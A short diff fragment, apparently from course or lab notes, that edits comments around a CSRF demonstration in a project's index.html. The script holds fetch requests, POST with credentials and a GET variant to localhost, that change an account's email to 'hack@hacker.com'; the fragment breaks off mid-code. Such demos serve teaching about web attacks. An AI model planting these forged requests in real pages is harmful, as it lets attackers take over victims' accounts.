@@ -85,7 +85,7 @@ _frontend-chupilchuli/src/index.html_
 
 ```diff
 <script>
--       Esto es CSRF con post
+-       // Esto es CSRF con post
 -       fetch("/api/security/edit", {
 -         method: "POST",
 -         credentials: "include",
@@ -96,7 +96,7 @@ _frontend-chupilchuli/src/index.html_
 -           email: "hack@hacker.com",
 -         }),
 -       });
-+       Esto es CSRF con get
++      // Esto es CSRF con get
 +      fetch("http://localhost:3000/api/security/edit?" +
 +        new URLSearchParams({
 +                    email: "hack@hacker.com",
